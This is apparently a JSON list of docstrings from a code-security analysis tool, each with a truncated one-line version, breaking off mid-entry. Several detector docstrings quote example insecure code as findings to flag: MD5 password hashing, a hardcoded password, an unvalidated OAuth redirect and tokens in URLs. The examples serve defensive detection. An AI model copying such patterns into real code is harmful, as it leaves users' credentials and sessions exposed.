    "original": "\"\"\"Extract control flow graph from tree-sitter AST.\n\n    NOTE: CFG extraction not implemented for generic tree-sitter.\n    Python projects should use Python's ast module (type=\"python_ast\").\n    TypeScript projects should use semantic parser (type=\"semantic_ast\").\n    Both have language-specific CFG implementations.\n\n    This stub prevents extraction failures when tree-sitter is used as fallback.\n\n    Args:\n        tree: Parsed AST tree dictionary\n        parser_self: ASTParser instance (for compatibility)\n        language: Source language (for compatibility)\n\n    Returns:\n        Empty list (no CFG data from generic tree-sitter)\n    \"\"\"",
    "truncated": "\"\"\"Extract control flow graph from tree-sitter AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Extract object literal properties via direct semantic AST traversal.\n\n    This is the centralized, correct implementation for object literal extraction.\n\n    ARCHITECTURAL CONTRACT:\n    -----------------------\n    This function is an IMPLEMENTATION layer component. It:\n    - RECEIVES: AST tree only (no file path context)\n    - EXTRACTS: Object literal data with line numbers\n    - RETURNS: List[Dict] with keys: line, variable_name, property_name, property_value, property_type, nested_level, in_function\n    - MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\n    File path context is provided by the INDEXER layer when storing to database.\n    See indexer/__init__.py:952 which calls db_manager.add_object_literal(file_path, obj_lit['line'], ...)\n\n    This separation ensures single source of truth for file paths.\n    \"\"\"",
    "truncated": "\"\"\"Extract object literal properties via direct semantic AST traversal.\"\"\""
  },
  {
    "file": "theauditor/boundaries/__init__.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Boundary Analysis Module.\n\nDetects and analyzes security boundaries in code:\n- Input validation boundaries\n- Authorization boundaries\n- Multi-tenant isolation boundaries\n- Sanitization boundaries\n- Output encoding boundaries\n\nKey Concept: Boundary Distance\n    Measures how many function calls separate an entry point from its control point.\n\n    Distance 0 = Perfect (control at entry)\n    Distance 1-2 = Acceptable (control nearby)\n    Distance 3+ = Risky (control too late)\n    None = Critical (no control found)\n\"\"\"",
    "truncated": "\"\"\"Boundary Analysis Module.\"\"\""
  },
  {
    "file": "theauditor/context/__init__.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Code context query module.\n\nThis module provides direct database query interfaces for AI-assisted\ncode navigation and refactoring. NO inference, NO embeddings, NO guessing -\njust exact SQL queries over TheAuditor's indexed data.\n\nArchitecture:\n- CodeQueryEngine: Main query interface\n- SymbolInfo/CallSite/Dependency: Typed result objects\n- format_output: Output formatting (text, json, tree)\n- Direct queries on repo_index.db and graphs.db\n\nPerformance:\n- Query time: <50ms (indexed lookups)\n- No caching needed (SQLite is fast enough)\n- Transitive queries use BFS (max depth: 5)\n\"\"\"",
    "truncated": "\"\"\"Code context query module.\"\"\""
  },
  {
    "file": "theauditor/context/formatters.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Output formatters for query results.\n\nSupports three formats:\n- text: Human-readable (default)\n- json: AI-consumable structured data\n- tree: Visual hierarchy (for transitive queries)\n\nNO EMOJIS: Windows Command Prompt uses CP1252 encoding which cannot\nhandle emoji characters. All output uses plain ASCII only.\n\nUsage:\n    from theauditor.context.formatters import format_output\n\n    results = engine.get_callers(\"authenticateUser\")\n    text = format_output(results, format='text')\n    json_str = format_output(results, format='json')\n\"\"\"",
    "truncated": "\"\"\"Output formatters for query results.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Find symbols similar to input for helpful 'Did you mean?' suggestions.\n\n        Searches DEFINITION tables (symbols, react_components) for partial matches.\n        Used when exact symbol lookup fails to help users find correct spelling.\n\n        Args:\n            input_name: User-provided symbol name that wasn't found\n            limit: Maximum suggestions to return\n\n        Returns:\n            List of similar symbol names (up to limit)\n\n        Example:\n            # User typed \"Sale\" but component is \"POSSale\"\n            suggestions = engine._find_similar_symbols(\"Sale\")\n            # Returns: [\"POSSale\", \"SaleResponse\", \"SalesReport\"]\n        \"\"\"",
    "truncated": "\"\"\"Find symbols similar to input for helpful 'Did you mean?' suggestions.\"\"\""
  },
  {
    "file": "theauditor/graph/builder.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Recursive lookup for the nearest tsconfig.json.\n\n        Returns the string 'context' expected by ModuleResolver.\n        This replaces hardcoded \"backend\"/\"frontend\" magic strings with\n        actual filesystem discovery.\n\n        Args:\n            folder_path: Directory to start searching from\n\n        Returns:\n            Relative path from project root to tsconfig directory, or \"root\"\n\n        Examples:\n            - backend/tsconfig.json exists → returns \"backend\"\n            - api/services/tsconfig.json exists → returns \"api/services\"\n            - No tsconfig.json found → returns \"root\"\n        \"\"\"",
    "truncated": "\"\"\"Recursive lookup for the nearest tsconfig.json.\"\"\""
  },
  {
    "file": "theauditor/graph/cfg_builder.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Batch load ALL CFG data for a file with exactly 2 queries.\n\n        This is the 2025 batch processing pattern that eliminates N+1 queries.\n        Instead of querying each function separately (3 queries × N functions),\n        we load ALL functions in a file at once (2 queries total).\n\n        Args:\n            file_path: Path to the source file\n\n        Returns:\n            Dict mapping function_name to CFG dict {blocks, edges, metrics}\n\n        Performance:\n            - Old: N functions × 3 queries = 3N queries\n            - New: 2 queries (regardless of N)\n            - 100 functions: 300 queries → 2 queries (150x faster)\n        \"\"\"",
    "truncated": "\"\"\"Batch load ALL CFG data for a file with exactly 2 queries.\"\"\""
  },
  {
    "file": "theauditor/graph/db_cache.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Normalize path to forward-slash format.\n\n        Guardian of Hygiene: All paths stored internally use forward slashes.\n        Builder.py never needs to call .replace(\"\\\\\", \"/\").\n\n        Args:\n            path: File path (Windows or Unix format)\n\n        Returns:\n            Normalized path with forward slashes\n\n        Examples:\n            >>> self._normalize_path(\"theauditor\\\\cli.py\")\n            \"theauditor/cli.py\"\n            >>> self._normalize_path(\"theauditor/cli.py\")\n            \"theauditor/cli.py\"\n        \"\"\"",
    "truncated": "\"\"\"Normalize path to forward-slash format.\"\"\""
  },
  {
    "file": "theauditor/graph/dfg_builder.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Parse an argument expression to extract the variable name.\n\n        Handles various expression types:\n        - Simple variables: \"data\" -> \"data\"\n        - Property access: \"obj.prop\" -> \"obj.prop\"\n        - Function calls: \"validate(data)\" -> \"data\" (unwrap)\n        - Async/Arrow functions: \"async () => {}\" -> \"function_expression\"\n        - Object literals: \"{a: 1}\" -> \"object_literal\"\n        - Array literals: \"[1, 2]\" -> \"array_literal\"\n        - String literals: \"'hello'\" -> \"string_literal\"\n\n        Args:\n            arg_expr: The argument expression string\n\n        Returns:\n            Variable name or placeholder, None if unparseable\n        \"\"\"",
    "truncated": "\"\"\"Parse an argument expression to extract the variable name.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Save custom graph type to database.\n\n        Generic method for saving any graph type beyond import/call/data_flow.\n        Enables extensibility for new graph types (e.g., terraform_provisioning).\n\n        Args:\n            graph: Graph dict with 'nodes' and 'edges' keys\n            graph_type: Custom type identifier (e.g., 'terraform_provisioning')\n\n        Example:\n            >>> store = XGraphStore()\n            >>> terraform_graph = {\n            ...     'nodes': [{'id': 'vpc', 'file': 'main.tf', ...}],\n            ...     'edges': [{'source': 'var.region', 'target': 'vpc', ...}]\n            ... }\n            >>> store.save_custom_graph(terraform_graph, 'terraform_provisioning')\n        \"\"\"",
    "truncated": "\"\"\"Save custom graph type to database.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/base.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"\n        Build specific graph edges (e.g. ORM, Middleware).\n\n        Args:\n            db_path: Path to sqlite database (repo_index.db)\n            project_root: Root path for metadata\n\n        Returns:\n            Dict containing:\n            - \"nodes\": List[dict] (from asdict(DFGNode))\n            - \"edges\": List[dict] (from asdict(DFGEdge))\n            - \"metadata\": dict with stats and graph_type\n\n        Raises:\n            Should NOT raise - return empty results on failure\n            Log errors but don't crash the build\n        \"\"\"",
    "truncated": "\"\"\"Build specific graph edges (e.g. ORM, Middleware).\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Add a GitHub Actions step record to the batch.\n\n        Args:\n            step_id: Composite PK (job_id||':'||sequence_order)\n            job_id: FK to github_jobs\n            sequence_order: Step order within job (0-indexed)\n            step_name: Optional name: field\n            uses_action: Action reference (e.g., 'actions/checkout@v4')\n            uses_version: Version/ref extracted from uses\n            run_script: Shell script content from run: field\n            shell: Shell type (bash, pwsh, python)\n            env: JSON object of step-level env vars\n            with_args: JSON object of action inputs (with: field)\n            if_condition: Conditional expression for step execution\n            timeout_minutes: Step timeout\n            continue_on_error: Continue on failure flag\n        \"\"\"",
    "truncated": "\"\"\"Add a GitHub Actions step record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/generic.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Extract config file data directly to database.\n\n        ARCHITECTURE CHANGE (v1.2 Nuclear Option):\n        - OLD: Return nested dict → indexer unpacks → database\n        - NEW: Call db_manager directly → no intermediate dict\n\n        Returns minimal dict for indexer compatibility.\n        Actual data flows directly to database via self.db_manager calls.\n\n        Args:\n            file_info: File metadata dictionary\n            content: File content as string\n            tree: Unused (configs don't have AST)\n\n        Returns:\n            Minimal dict for indexer (empty lists, no config_data nesting)\n        \"\"\"",
    "truncated": "\"\"\"Extract config file data directly to database.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Analyze import statements to determine import style.\n\n        Classifies imports into categories for tree-shaking analysis:\n        - namespace: import * as lodash from 'lodash' (prevents tree-shaking)\n        - named: import { map, filter } from 'lodash' (allows tree-shaking)\n        - default: import lodash from 'lodash' (depends on export structure)\n        - side-effect: import 'polyfill' (no tree-shaking, intentional)\n\n        This enables bundle_analyze.py CHECK 3 (inefficient namespace imports).\n\n        Args:\n            imports: List of import dictionaries from ast_parser\n            file_path: Path to the file being analyzed\n\n        Returns:\n            List of import style records for database\n        \"\"\"",
    "truncated": "\"\"\"Analyze import statements to determine import style.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/rust.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Rust file extractor using tree-sitter.\n\nThis implementation uses tree-sitter-rust for complete AST traversal,\nreplacing the previous LSP-based approach (see rust_lsp_backup.py).\n\nWhy tree-sitter over LSP:\n- Complete AST access (LSP only provides symbol locations)\n- No regex needed (LSP required regex for imports - forbidden pattern)\n- Faster (~10ms vs ~200ms per file)\n- No temporary workspace or binary installation required\n- Provides all 12 required extraction methods\n\nLSP code preserved in:\n- theauditor/indexer/extractors/rust_lsp_backup.py\n- theauditor/lsp/rust_analyzer_client.py\n- theauditor/toolboxes/rust.py\n\"\"\"",
    "truncated": "\"\"\"Rust file extractor using tree-sitter.\"\"\""
  },
  {
    "file": "theauditor/indexer/orchestrator.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect frameworks inline without file dependency.\n\n        Replaces file-based loading with direct detection to avoid\n        chicken-and-egg problem where frameworks.json doesn't exist\n        until after indexer runs.\n\n        Stores results to frameworks table via _store_frameworks() call\n        at line 229 after second JSX pass completes.\n\n        Returns:\n            List of framework dictionaries with keys:\n            - framework: str (e.g., \"express\", \"react\")\n            - version: str (e.g., \"4.18.2\" or \"unknown\")\n            - language: str (e.g., \"javascript\", \"python\")\n            - path: str (e.g., \".\" or \"backend\" for monorepos)\n            - source: str (e.g., \"package.json\", \"requirements.txt\")\n        \"\"\"",
    "truncated": "\"\"\"Detect frameworks inline without file dependency.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/utils.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Foreign key relationship metadata for JOIN query generation.\n\n    Purpose: Enables build_join_query() to validate and construct JOINs.\n    NOT used for CREATE TABLE generation (database.py defines FKs).\n\n    Attributes:\n        local_columns: Column names in this table (e.g., ['query_file', 'query_line'])\n        foreign_table: Referenced table name (e.g., 'sql_queries')\n        foreign_columns: Column names in foreign table (e.g., ['file_path', 'line_number'])\n\n    Example:\n        ForeignKey(\n            local_columns=['query_file', 'query_line'],\n            foreign_table='sql_queries',\n            foreign_columns=['file_path', 'line_number']\n        )\n    \"\"\"",
    "truncated": "\"\"\"Foreign key relationship metadata for JOIN query generation.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/features.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"\n    Extract Tier 5 features from session_executions table (new 3-layer system).\n\n    Reads pre-computed session analysis data instead of parsing logs on-the-fly.\n    Features:\n    - session_workflow_compliance: Avg compliance_score for file\n    - session_avg_risk_score: Avg risk_score for file\n    - session_blind_edit_rate: Percentage of blind edits\n    - session_user_engagement: Avg user_engagement_rate (INVERSE METRIC: lower = better)\n\n    Args:\n        db_path: Path to session database (default: .pf/ml/session_history.db)\n        file_paths: List of files to analyze\n\n    Returns:\n        dict with 4 new Tier 5 features per file\n    \"\"\"",
    "truncated": "\"\"\"Extract Tier 5 features from session_executions table (new 3-layer system).\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Represents a semantic pattern (obsolete, current, or transitional).\n\n    A pattern defines what code constructs mean in the context of your business logic.\n    For example, \"product.unit_price\" might be obsolete if you've refactored to use\n    \"product_variant.retail_price\" instead.\n\n    Attributes:\n        id: Unique identifier for this pattern\n        pattern: Regex pattern to match against finding messages/rules\n        reason: Human-readable explanation of why this pattern matters\n        category: 'obsolete', 'current', or 'transitional'\n        severity: How critical is it (for obsolete patterns)\n        replacement: Suggested replacement pattern\n        scope: Which files this applies to (include/exclude lists)\n        expires: When transitional patterns become obsolete (YYYY-MM-DD)\n        compiled_regex: Pre-compiled regex for performance\n    \"\"\"",
    "truncated": "\"\"\"Represents a semantic pattern (obsolete, current, or transitional).\"\"\""
  },
  {
    "file": "theauditor/js_semantic_parser.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Get semantic ASTs for multiple JavaScript/TypeScript files in a single process.\n\n        This dramatically improves performance by reusing the TypeScript program\n        and dependency cache across multiple files.\n\n        PHASE 5: UNIFIED SINGLE-PASS ARCHITECTURE\n        All data (symbols, calls, CFG, etc.) extracted in one call.\n        No more two-pass system with cfg_only flag.\n\n        Args:\n            file_paths: List of paths to JavaScript or TypeScript files to parse\n            jsx_mode: JSX transformation mode ('transformed' or 'preserved')\n            tsconfig_map: Optional mapping of file paths to tsconfig paths\n\n        Returns:\n            Dictionary mapping file paths to their AST results\n        \"\"\"",
    "truncated": "\"\"\"Get semantic ASTs for multiple JavaScript/TypeScript files in a single process.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/oauth_analyze.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect OAuth and SSO security vulnerabilities.\n\n    This is a database-first rule following the gold standard pattern.\n    NO file I/O, NO AST traversal - only SQL queries on indexed data.\n    All pattern matching done in Python after database fetch.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of OAuth/SSO security findings\n\n    Example findings:\n        - OAuth redirect without state parameter\n        - res.redirect(req.query.redirect_uri) without validation\n        - const url = `/#access_token=${token}`\n    \"\"\"",
    "truncated": "\"\"\"Detect OAuth and SSO security vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/oauth_analyze.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"OAuth/SSO Security Analyzer - Database-First Approach.\n\nDetects OAuth and Single Sign-On security vulnerabilities using database-driven approach.\nFollows gold standard patterns from jwt_analyze.py.\n\nNO AST TRAVERSAL. NO FILE I/O. PURE DATABASE QUERIES.\n\nDetects:\n- Missing state parameter in OAuth flows (CSRF)\n- Redirect URI validation bypass\n- OAuth tokens in URL fragments/parameters\n\nCWE Coverage:\n- CWE-352: Cross-Site Request Forgery (CSRF)\n- CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n- CWE-598: Use of GET Request Method With Sensitive Query Strings\n\"\"\"",
    "truncated": "\"\"\"OAuth/SSO Security Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/password_analyze.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect password security vulnerabilities.\n\n    This is a database-first rule following the gold standard pattern.\n    NO file I/O, NO AST traversal - only SQL queries on indexed data.\n    All pattern matching done in Python after database fetch.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of password security findings\n\n    Example findings:\n        - const hashed = md5(password)\n        - const adminPassword = \"admin123\"\n        - const url = `/reset?password=${pwd}`\n    \"\"\"",
    "truncated": "\"\"\"Detect password security vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/session_analyze.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect session and cookie security vulnerabilities.\n\n    This is a database-first rule following the gold standard pattern.\n    NO file I/O, NO AST traversal - only SQL queries on indexed data.\n    All pattern matching done in Python after database fetch.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of session security findings\n\n    Example findings:\n        - res.cookie('token', jwt) without httpOnly flag\n        - session() middleware without maxAge configuration\n        - req.session.userId = user.id without session.regenerate()\n    \"\"\"",
    "truncated": "\"\"\"Detect session and cookie security vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/common/util.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Security Analysis Utility Library.\n\nCommon utility functions for security pattern detection and analysis.\nProvides entropy calculation, pattern recognition, and encoding validation.\n\nIMPORTANT: This is a UTILITY MODULE, not a security rule.\n- Does NOT query the database\n- Does NOT implement StandardRuleContext interface\n- Provides pure computational functions for other rules to use\n\nThese functions analyze strings/patterns algorithmically and don't need\ndatabase access. They're used by security rules to analyze data that\nthe rules have already extracted from the database.\n\nModule Type: Utility Library (no rule interface required)\nStatus: No refactor needed - correct as-is\n\"\"\"",
    "truncated": "\"\"\"Security Analysis Utility Library.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/ghost_dependencies.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect ghost dependencies - packages imported but not declared.\n\nGhost dependencies are packages that are used in code (via import/require)\nbut not declared in package.json or requirements.txt. This creates hidden\ndependencies that can break builds when node_modules or virtualenv are\nrecreated.\n\nDetection Strategy:\n1. Query import_styles table for all package imports\n2. Query package_configs table for all declared dependencies\n3. Find imports that don't have matching declarations\n4. Exclude stdlib packages (built-in Python/Node.js modules)\n\nDatabase Tables Used:\n- import_styles: Track all import/require statements\n- package_configs: Declared dependencies from package files\n\"\"\"",
    "truncated": "\"\"\"Detect ghost dependencies - packages imported but not declared.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/express_analyze.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect Express.js security misconfigurations.\n\n    Analyzes database for:\n    - Missing Helmet security middleware\n    - Missing error handler (try/catch) in routes\n    - XSS vulnerabilities (direct output of user input)\n    - Synchronous operations blocking event loop\n    - Missing rate limiting on API endpoints\n    - Body parser without size limit\n    - Database queries directly in route handlers\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of StandardFinding objects for detected issues\n    \"\"\"",
    "truncated": "\"\"\"Detect Express.js security misconfigurations.\"\"\""
  },
  {
    "file": "theauditor/rules/orm/prisma_analyze.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect Prisma ORM anti-patterns and performance issues.\n\n    Detects:\n    - Unbounded queries without pagination\n    - N+1 query patterns\n    - Missing transactions for multiple writes\n    - Unhandled OrThrow methods\n    - Unsafe raw SQL queries\n    - Missing database indexes\n    - Connection pool configuration issues\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of Prisma ORM issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect Prisma ORM anti-patterns and performance issues.\"\"\""
  },
  {
    "file": "theauditor/rules/performance/perf_analyze.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect performance anti-patterns and inefficiencies.\n\n    Detects:\n    - Database queries in loops (N+1 problem)\n    - Expensive operations in loops\n    - Inefficient string concatenation\n    - Synchronous I/O blocking event loop\n    - Unbounded operations\n    - Deep property access chains\n    - Unoptimized taint flows\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of performance issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect performance anti-patterns and inefficiencies.\"\"\""
  },
  {
    "file": "theauditor/rules/security/input_validation_analyze.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect input validation vulnerabilities.\n\n    Detects:\n    - Prototype pollution\n    - NoSQL injection\n    - Template injection\n    - Type confusion\n    - Validation bypasses\n    - Framework-specific issues\n    - ORM injection patterns\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of input validation vulnerabilities found\n    \"\"\"",
    "truncated": "\"\"\"Detect input validation vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/component_analyze.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect Vue component anti-patterns and performance issues.\n\n    Detects:\n    - Props mutation anti-pattern\n    - Missing keys in v-for loops\n    - Excessive component complexity\n    - Unnecessary re-renders\n    - Missing component names\n    - Inefficient computed properties\n    - Template expression complexity\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of Vue component issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect Vue component anti-patterns and performance issues.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/hooks_analyze.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect Vue Composition API hooks misuse and issues.\n\n    Detects:\n    - Hooks called outside setup()\n    - Missing cleanup in lifecycle hooks\n    - Dependency issues in watch/computed\n    - Memory leaks from refs/reactive\n    - Incorrect hook ordering\n    - Excessive reactivity overhead\n    - Missing error boundaries\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of Vue hooks issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect Vue Composition API hooks misuse and issues.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/lifecycle_analyze.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect Vue lifecycle hook misuse and anti-patterns.\n\n    Detects:\n    - DOM access before mount\n    - Missing cleanup in destroy/unmount\n    - Data fetching in wrong hooks\n    - Infinite update loops\n    - Memory leaks from timers\n    - Side effects in computed\n    - Hook execution order issues\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of Vue lifecycle issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect Vue lifecycle hook misuse and anti-patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/render_analyze.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect Vue rendering anti-patterns and performance issues.\n\n    Detects:\n    - v-if with v-for (performance anti-pattern)\n    - Missing keys in lists\n    - Unnecessary re-renders\n    - Large lists without virtualization\n    - Complex computed chains\n    - Direct DOM manipulation\n    - Inefficient event handlers\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of Vue render issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect Vue rendering anti-patterns and performance issues.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/state_analyze.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Detect Vue state management anti-patterns (Vuex/Pinia).\n\n    Detects:\n    - Direct state mutations outside mutations\n    - Missing namespacing in modules\n    - Synchronous operations in actions\n    - State persistence issues\n    - Memory leaks from subscriptions\n    - Circular dependencies in getters\n    - Excessive store size\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of Vue state management issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect Vue state management anti-patterns (Vuex/Pinia).\"\"\""
  },
  {
    "file": "theauditor/taint/access_path.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Represents a path through object fields: base.field1.field2...\n\n    Examples:\n        req.body.userId  → AccessPath(file=\"controller.ts\", function=\"create\",\n                                      base=\"req\", fields=(\"body\", \"userId\"))\n        user.data        → AccessPath(file=\"service.ts\", function=\"save\",\n                                      base=\"user\", fields=(\"data\",))\n        localVar         → AccessPath(file=\"util.ts\", function=\"helper\",\n                                      base=\"localVar\", fields=())\n\n    Attributes:\n        file: Source file path\n        function: Containing function (or \"global\")\n        base: Base variable name\n        fields: Tuple of field names (empty for simple variables)\n        max_length: k-limiting bound (default 5)\n    \"\"\"",
    "truncated": "\"\"\"Represents a path through object fields: base.field1.field2...\"\"\""
  },
  {
    "file": "theauditor/taint/discovery.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"\n        Filter out sinks that are automatically safe due to framework protections.\n\n        Database-driven approach: Queries framework_safe_sinks table populated during indexing.\n        ZERO FALLBACK POLICY: No hardcoded safe patterns.\n\n        Examples from database:\n        - Express res.json() (auto-escapes JSON)\n        - React components (escape by default)\n        - Parameterized SQL queries\n\n        Args:\n            sinks: List of discovered sinks\n\n        Returns:\n            Filtered list of sinks that are actually vulnerable\n        \"\"\"",
    "truncated": "\"\"\"Filter out sinks that are automatically safe due to framework protections.\"\"\""
  },
  {
    "file": "theauditor/taint/sanitizer_util.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Check if a taint path goes through any sanitizer.\n\n        This is the UNIFIED sanitizer detection logic used by both engines.\n        Combines the most comprehensive checks from both implementations.\n\n        Checks THREE types of sanitizers:\n        1. Validation patterns in node names (validateBody, validateParams, etc.)\n        2. Validation framework sanitizers (location-based: file:line match)\n        3. Safe sink patterns (name-based: function name pattern match)\n\n        Args:\n            hop_chain: List of hops/nodes in the taint path\n\n        Returns:\n            Dict with sanitizer metadata if path is sanitized, None if vulnerable\n            Format: {'file': str, 'line': int, 'method': str}\n        \"\"\"",
    "truncated": "\"\"\"Check if a taint path goes through any sanitizer.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/base.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Extract all variable names from a TypeScript/JavaScript AST node.\n\n    This is the AST-pure replacement for the gutted extract_vars_from_tree_sitter_expr().\n    Recursively traverses the TypeScript compiler API AST to find all identifiers.\n\n    Args:\n        node: TypeScript AST node (Dict from semantic parser)\n        depth: Recursion depth to prevent infinite loops\n\n    Returns:\n        List of variable names found in the expression\n\n    Example:\n        node = {\"kind\": \"BinaryExpression\", \"text\": \"req.body.name\", ...}\n        returns [\"req.body.name\", \"req.body\", \"req\"]\n    \"\"\"",
    "truncated": "\"\"\"Extract all variable names from a TypeScript/JavaScript AST node.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/advanced_extractors.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Extract bytes/bytearray operations.\n\n    Detects:\n    - bytes() constructor calls\n    - bytearray() constructor calls\n    - .encode()/.decode() calls\n    - bytes literals (b'...')\n\n    Returns:\n        List of bytes operation dicts:\n        {\n            'line': int,\n            'operation': str,  # 'bytes' | 'bytearray' | 'encode' | 'decode' | 'literal'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract bytes/bytearray operations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/advanced_extractors.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Python Coverage V2 - Advanced Patterns (8 extractors).\n\nExtracts advanced/rarely-used Python patterns for complete coverage beyond\nbasic curriculum needs. These patterns are typically seen in advanced libraries\nand frameworks rather than introductory Python code.\n\nArchitectural Contract (CRITICAL):\n===================================\nAll extraction functions:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with pattern-specific keys\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\n\"\"\"",
    "truncated": "\"\"\"Python Coverage V2 - Advanced Patterns (8 extractors).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/class_feature_extractors.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Extract metaclass definitions and usage.\n\n    Detects:\n    - Classes that inherit from type\n    - Classes using metaclass= parameter\n    - __metaclass__ attribute (Python 2 style)\n\n    Returns:\n        List of metaclass dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'metaclass_name': str,\n            'is_definition': bool,  # True if defining metaclass, False if using\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract metaclass definitions and usage.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_web_extractors.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Extract Django middleware class definitions.\n\n    Detects:\n    - Middleware class definitions (MiddlewareMixin, callable classes)\n    - process_request() method (pre-view processing)\n    - process_response() method (post-view processing)\n    - process_exception() method (exception handling)\n    - process_view() method (view-level processing)\n    - process_template_response() method (template processing)\n\n    Security relevance:\n    - process_request without auth checks = bypass opportunity\n    - process_response modifying sensitive data = data leakage\n    - process_exception logging = information disclosure\n    - Missing middleware hooks = incomplete security layer\n    \"\"\"",
    "truncated": "\"\"\"Extract Django middleware class definitions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_web_extractors.py",
    "line": -1,
    "original_lines": 16,
